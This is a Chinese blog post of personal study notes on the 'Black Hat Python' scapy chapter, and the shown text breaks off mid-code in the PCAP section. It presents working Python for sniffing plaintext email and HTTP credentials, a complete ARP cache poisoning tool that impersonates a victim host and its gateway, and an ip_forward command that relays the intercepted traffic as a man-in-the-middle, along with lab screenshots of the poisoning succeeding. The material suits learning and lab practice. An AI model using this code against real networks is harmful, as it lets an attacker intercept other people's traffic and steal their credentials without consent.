<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="个人的知识笔记。">
<meta property="og:type" content="article">
<meta property="og:title" content="第 3 章 scapy：网络的掌控者">
<meta property="og:url" content="https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/index.html">
<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
<meta property="og:description" content="个人的知识笔记。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617154433.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617155430.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617221053.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617222600.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211703.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211837.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212028.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212248.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220721.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220806.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619221205.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619223422.png">
<meta property="article:published_time" content="2022-06-18T16:00:00.000Z">
<meta property="article:modified_time" content="2022-06-24T00:19:11.770Z">
<meta property="article:author" content="hdfzzf">
<meta property="article:tag" content="python">
<meta property="article:tag" content="black_hat_python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617154433.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/LOGO.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>第 3 章 scapy：网络的掌控者</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2022/06/23/%E7%AC%AC%204%20%E7%AB%A0%20Web%20%E6%94%BB%E5%87%BB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2022/06/15/%E7%AC%AC%202%20%E7%AB%A0%20%E5%8E%9F%E5%A7%8B%20socket%20%E5%92%8C%E6%B5%81%E9%87%8F%E5%97%85%E6%8E%A2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AA%83%E5%8F%96-email-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.</span> <span class="toc-text">1. 窃取 Email 认证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#arp-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="toc-number">2.</span> <span class="toc-text">2. ARP 缓存投毒</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%84%E7%90%86-pcap-%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">3. 处理 PCAP 文件</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        第 3 章 scapy：网络的掌控者
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hdfzzf</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-06-18T16:00:00.000Z" itemprop="datePublished">2022-06-19</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/black-hat-python/">black_hat_python</a> › <a class="category-link" href="/categories/python/">python</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/black-hat-python/" rel="tag">black_hat_python</a>, <a class="tag-link-link" href="/tags/python/" rel="tag">python</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="窃取-email-认证">1. 窃取 Email 认证</h1>
<p>首先，我们在前一章中做了许多工作，实现了网络的嗅探功能，但是很多工作都是从头开始，比如创建socket，从缓冲接收数据，对数据进行解析等工作，本章介绍的模块 <code>scapy</code> 将会非常简单的实现上嗅探的工作。</p>
<p><code>scapy</code> 安装方式：<code>pip3 install scapy</code> 即可</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617154433.png" /></p>
<p>然后介绍内置的一个函数 sniff： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sniff(<span class="built_in">filter</span>=<span class="string">&#x27;&#x27;</span>, iface=<span class="string">&#x27;any&#x27;</span>, prn=function, count=N)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>filter：允许我们对scapy嗅探的数据包指定一个BPF(Berkeley Packet Filter)过滤器。比如说，我们可以将BPF过滤器设置为 <code>tcp port 80</code> ，这样就只嗅探 HTTP 分组。当然，也可以将该参数留空以嗅探所有分组</li>
<li>iface：设置嗅探的网卡，如果留空，则对所有网卡进行嗅探</li>
<li>prn：指定一个回调函数，当嗅探到符合BPF过滤器的分组时，需要调用该回调函数，<strong>这个回调函数以接收到的数据包对象作为唯一的参数</strong>。</li>
<li>count：指定需要嗅探的分组个数。留空则scapy嗅探无限个分组</li>
</ul>
<p>编写一个简单的代码： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packet_callback</span>(<span class="params">packet</span>):</span>  </span><br><span class="line">    <span class="built_in">print</span>(packet.show())</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    sniff(prn=packet_callback)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>然后运行该代码（以root权限），等待收到的数据（可以打开一个网页，就会收到响应），然后该程序的作用会将分组信息显示出来(<code>packet.show()</code>)</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617155430.png" /></p>
<p>解析来，将上述的代码进行修改，我们只需要嗅探跟Email有关的分组，并且获得里面的信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> TCP, IP  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packet_callback</span>(<span class="params">packet</span>):</span>  </span><br><span class="line">    <span class="keyword">if</span> packet[TCP].payload:  </span><br><span class="line">        mypacket = <span class="built_in">str</span>(packet[TCP].payload)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> mypacket.lower() <span class="keyword">or</span> <span class="string">&#x27;pass&#x27;</span> <span class="keyword">in</span> mypacket.lower():  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Destination: <span class="subst">&#123;packet[IP].dst&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;<span class="built_in">str</span>(packet[TCP].payload)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    <span class="comment"># 110 POP3, 143 IMAP, 25 SMTP  </span></span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&#x27;tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80&#x27;</span>, prn=packet_callback, store=<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>这里的 filter 涉及到 BRF syntax（也叫做 Wireshark style），这里的意思是：只需要tcp协议，并且端口为110，25，143的分组，这三个端口是Email相关的协议使用的端口。然后打印出目标IP和用户名密码。</p>
<p>但是现在基本没有明文传输的，除非自己搭建服务，因此这里添加一个80端口看一下效果</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617221053.png" /></p>
<p>因为HTTP协议中有一个 User-Agent 所以能够满足条件从而打印 payload</p>
<p>书中的结果如下图：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617222600.png" /></p>
<h1 id="arp-缓存投毒">2. ARP 缓存投毒</h1>
<p>原理其实就是两边骗：</p>
<ol type="1">
<li>欺骗目标主机，使其相信我们的攻击主机就是它的网关</li>
<li>欺骗网关，使其相信我们就是目标主机</li>
</ol>
<blockquote>
<p>ARP缓存投毒只针对 IPv4</p>
</blockquote>
<p>需要具备1个条件：</p>
<ul>
<li>攻击主机和目标主机处于同一个网络，也就是网关相同</li>
<li>知道目标 IP 和网关 IP</li>
</ul>
<p>过程：</p>
<ol type="1">
<li>根据目标 IP 和网关 IP 分别获得目标主机的 MAC 地址和网关的 MAC 地址。<code>get_mac</code> 函数中实现</li>
<li>不停的分别给目标主机发送 ARP 响应分组（op=2），给网关发送 ARP 响应分组（op=2）。<code>Arper.poison()</code> 方法中实现</li>
<li>不停的监听网卡，当收到 IP 地址为目标主机的分组（可能是网关发的，也可能是目标主机发的），说明目标主机/网关的 ARP 缓存表已被更新，投毒成功，并将包的内容写入到 arper.pcap。 <code>Arper.sniff()</code> 方法中实现</li>
<li>成功接收 100 个分组之后停止投毒。发送正确的 ARP 响应分组来恢复 ARP 缓存表。<code>Arper.restore()</code> 方法中实现</li>
</ol>
<p>代码如下：</p>
<ul>
<li>攻击主机 IP：10.0.2.4</li>
<li>目标主机 IP：10.0.2.21</li>
<li>网关 IP：10.0.2.1</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process  </span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> os, sys, time  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Arper</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, victim, gateway, interface=<span class="string">&#x27;eth0&#x27;</span></span>):</span>  </span><br><span class="line">        self.victim = victim  </span><br><span class="line">        self.victimmac = get_mac(victim)  </span><br><span class="line">        self.gateway = gateway  </span><br><span class="line">        self.gatewaymac =get_mac(gateway)  </span><br><span class="line">        self.interface = interface  </span><br><span class="line">        conf.iface = interface  </span><br><span class="line">        conf.verb = <span class="number">0</span>  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Initialized <span class="subst">&#123;interface&#125;</span>: &#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Gateway (<span class="subst">&#123;gateway&#125;</span>) is at <span class="subst">&#123;self.gatewaymac&#125;</span>.&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Victim (<span class="subst">&#123;victim&#125;</span>) is at <span class="subst">&#123;self.victimmac&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">30</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        self.poison_thread = Process(target=self.poison)  </span><br><span class="line">        self.poison_thread.start()  </span><br><span class="line">  </span><br><span class="line">        self.sniff_thread = Process(target=self.sniff)  </span><br><span class="line">        self.sniff_thread.start()  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poison</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        <span class="comment"># poison_victim: 欺骗 victim，假装为网关给 victim 发送  </span></span><br><span class="line">        poison_victim = ARP()  </span><br><span class="line">        poison_victim.op = <span class="number">2</span>  </span><br><span class="line">        poison_victim.psrc = self.gateway  </span><br><span class="line">        poison_victim.pdst = self.victim  </span><br><span class="line">        poison_victim.hwdst = self.victimmac  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip src: <span class="subst">&#123;poison_victim.psrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip dst: <span class="subst">&#123;poison_victim.pdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac src: <span class="subst">&#123;poison_victim.hwsrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac dst: <span class="subst">&#123;poison_victim.hwdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(poison_victim.summary())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">30</span>)  </span><br><span class="line">        <span class="comment"># poison_gateway: 欺骗 gateway，假装为 victim 给网关发送  </span></span><br><span class="line">        poison_gateway = ARP()  </span><br><span class="line">        poison_gateway.op = <span class="number">2</span>  </span><br><span class="line">        poison_gateway.psrc = self.victim  </span><br><span class="line">        poison_gateway.pdst = self.gateway  </span><br><span class="line">        poison_gateway.hwdst = self.gatewaymac  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip src: <span class="subst">&#123;poison_gateway.psrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip dst: <span class="subst">&#123;poison_gateway.pdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac src: <span class="subst">&#123;poison_gateway.hwsrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac dst: <span class="subst">&#123;poison_gateway.hwdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(poison_gateway.summary())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">30</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Beginning the ARP poison. [CTRL-C to stop]&#x27;</span>)  </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;.&#x27;</span>)  <span class="comment"># 往stdout缓冲区中写入 .</span></span><br><span class="line">            sys.stdout.flush()  <span class="comment"># stdout缓冲区不会一有内容就输出，该函数的作用就是显示的触发 stdout 输出缓冲区的内容</span></span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                send(poison_victim)  </span><br><span class="line">                send(poison_gateway)  </span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:  </span><br><span class="line">                self.restore()  </span><br><span class="line">                sys.exit()  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                time.sleep(<span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sniff</span>(<span class="params">self, count=<span class="number">100</span></span>):</span>  </span><br><span class="line">        time.sleep(<span class="number">5</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Sniffing <span class="subst">&#123;count&#125;</span> packet&#x27;</span>)  </span><br><span class="line">        bpf_filter = <span class="string">&#x27;ip host %s&#x27;</span> % self.victim  </span><br><span class="line">        packets = sniff(count=count, <span class="built_in">filter</span> = bpf_filter, iface=self.interface)  </span><br><span class="line">        wrpcap(<span class="string">&#x27;arper.pcap&#x27;</span>, packets)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Got the packets&#x27;</span>)  </span><br><span class="line">        self.restore()  </span><br><span class="line">        self.poison_thread.terminate()  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Finished.&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restore</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Restoring ARP tables...&#x27;</span>)  </span><br><span class="line">        send(ARP(  </span><br><span class="line">            op = <span class="number">2</span>,  </span><br><span class="line">            psrc = self.gateway,  </span><br><span class="line">            pdst = self.victim,  </span><br><span class="line">            hwsrc = self.gatewaymac,  </span><br><span class="line">            hwdst = <span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>),  </span><br><span class="line">            count = <span class="number">5</span>)  </span><br><span class="line">  </span><br><span class="line">        send(ARP(  </span><br><span class="line">            op = <span class="number">2</span>,  </span><br><span class="line">            psrc = self.victim,  </span><br><span class="line">            pdst = self.gateway,  </span><br><span class="line">            hwsrc = self.victimmac,  </span><br><span class="line">            hwdst = <span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>),  </span><br><span class="line">            count = <span class="number">5</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span>(<span class="params">target_ip</span>):</span>  </span><br><span class="line">    <span class="comment"># Ether: 广播， ARP：请求MAC地址  </span></span><br><span class="line">    packet = Ether(dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>)/ARP(op=<span class="string">&quot;who-has&quot;</span>, pdst=target_ip)  </span><br><span class="line">    resp, _ = srp(packet, timeout=<span class="number">2</span>, retry=<span class="number">10</span>, verbose=<span class="literal">False</span>)  </span><br><span class="line">    <span class="keyword">for</span> _, r <span class="keyword">in</span> resp:  </span><br><span class="line">        <span class="keyword">return</span> r[Ether].src  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    (victim, gateway, interface) = (sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])  </span><br><span class="line">    myarp = Arper(victim, gateway, interface)  </span><br><span class="line">    myarp.run()</span><br></pre></td></tr></table></figure>
<p>在运行之前，我们首先要打开攻击主机的转发功能，当我们收到目标主机来的分组的时候要将其转发出去（给网关），从网关收到发给目标主机的分组也需要进行转发</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward # 需要在 root 用户下执行</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211703.png" /></p>
<p>（等待了许久才用目标主机访问网站，这是因为 arp 缓存表是有时间限制的，投毒时间久一点能够保证目标主机和网关都被投毒。如果只有一方就很尴尬了）</p>
<p>看一下目标主机此时的 arp 缓存表：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211837.png" /></p>
<p>可以看到 10.0.2.1（网关）和 10.0.2.4（攻击主机）的MAC地址一样，都是攻击主机的MAC地址，说明对目标主机投毒成功</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212028.png" /></p>
<p>看一下 arper.pcap 文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212248.png" /></p>
<p>可以看到，攻击主机成功当上了目标主机和网关之间的“代理”。</p>
<h1 id="处理-pcap-文件">3. 处理 PCAP 文件</h1>
<p>接下来处理刚刚获得的 pcap 文件，我们要求从中找到 HTTP 报文，并从中取出图片。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, re, sys, zlib, collections</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">OUTDIR = os.path.join(pwd, <span class="string">&#x27;picture&#x27;</span>)</span><br><span class="line">Response = collections.namedtuple(<span class="string">&#x27;Response&#x27;</span>, [<span class="string">&#x27;header&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Recapper</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, fname</span>):</span></span><br><span class="line">        pcap = rdpcap(fname) <span class="comment"># 读取 pcap 文件的内容</span></span><br><span class="line">        self.sessions = pcap.sessions() <span class="comment"># 剥离每个 TCP 会话</span></span><br><span class="line">        self.responses = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_responses</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> session <span class="keyword">in</span> self.sessions:</span><br><span class="line">            payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> packet <span class="keyword">in</span> self.sessions[session]: <span class="comment"># 读取每个会话的所有分组</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet[TCP].dport == <span class="number">80</span> <span class="keyword">or</span> packet[TCP].sport == <span class="number">80</span>:</span><br><span class="line">                        payload += <span class="built_in">bytes</span>(packet[TCP].payload)</span><br><span class="line">                <span class="keyword">except</span> IndexError:</span><br><span class="line">                    sys.stdout.write(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> payload:</span><br><span class="line">                header = get_header(payload)</span><br><span class="line">                <span class="keyword">if</span> header <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                self.responses.append(Response(header=header, payload=payload))</span><br><span class="line">                </span><br><span class="line">    <span class="function"><span 